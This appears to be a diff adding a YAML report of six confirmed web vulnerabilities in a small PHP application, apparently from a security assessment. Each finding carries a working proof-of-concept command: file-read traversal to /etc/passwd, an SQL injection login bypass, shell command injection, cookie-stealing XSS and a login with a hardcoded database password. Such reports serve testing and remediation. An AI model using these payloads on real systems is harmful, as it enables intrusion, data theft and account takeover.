@@ -1,0 +1,86 @@
+validated_findings:
+  - finding_id: VULN-001
+    status: confirmed
+    type: local_file_inclusion
+    location:
+      file: src/view.php
+      line: 12
+    attack_path:
+      - step: 1
+        action: "Send request with page parameter pointing to sensitive file"
+      - step: 2
+        action: "Observe file contents in response body"
+    proof_of_concept: "curl http://target/view.php?page=../../etc/passwd"
+    impact: "Arbitrary file read, potential RCE via log poisoning or PHP filter chains"
+
+  - finding_id: VULN-002
+    status: confirmed
+    type: sql_injection
+    location:
+      file: src/login.php
+      line: 15
+    attack_path:
+      - step: 1
+        action: "Submit login form with SQL injection payload in username field"
+      - step: 2
+        action: "Bypass authentication and gain admin access"
+    proof_of_concept: "curl -X POST http://target/login.php -d \"user=admin'--&pass=x\""
+    impact: "Authentication bypass, full database access, potential data exfiltration"
+
+  - finding_id: VULN-003
+    status: confirmed
+    type: command_injection
+    location:
+      file: src/exec.php
+      line: 10
+    attack_path:
+      - step: 1
+        action: "Submit POST request with shell metacharacters in host parameter"
+      - step: 2
+        action: "Observe command output appended to ping results"
+    proof_of_concept: "curl -X POST http://target/exec.php -d \"host=127.0.0.1;id\""
+    impact: "Remote code execution as web server user, full system compromise"
+
+  - finding_id: VULN-004
+    status: confirmed
+    type: xss_reflected
+    location:
+      file: src/profile.php
+      line: 18
+    attack_path:
+      - step: 1
+        action: "Craft URL with JavaScript payload in name parameter"
+      - step: 2
+        action: "Send crafted URL to victim, script executes in their browser"
+    proof_of_concept: "curl 'http://target/profile.php?name=<script>alert(document.cookie)</script>'"
+    impact: "Session hijacking, credential theft, phishing via injected content"
+
+  - finding_id: VULN-005
+    status: confirmed
+    type: path_traversal
+    location:
+      file: src/download.php
+      line: 14
+    attack_path:
+      - step: 1
+        action: "Send request with directory traversal sequences in file parameter"
+      - step: 2
+        action: "Read arbitrary files from the server filesystem"
+    proof_of_concept: "curl 'http://target/download.php?file=../../../etc/passwd'"
+    impact: "Arbitrary file read, exposure of configuration files and credentials"
+
+  - finding_id: VULN-006
+    status: confirmed
+    type: hardcoded_credentials
+    location:
+      file: src/config.php
+      line: 5
+    attack_path:
+      - step: 1
+        action: "Obtain source code via LFI, path traversal, or repository exposure"
+      - step: 2
+        action: "Extract hardcoded database password from config.php"
+      - step: 3
+        action: "Connect to database using extracted credentials"
+    proof_of_concept: "mysql -h target -u root -p'SuperSecret123!' app_db"
+    impact: "Direct database access, data exfiltration, privilege escalation"
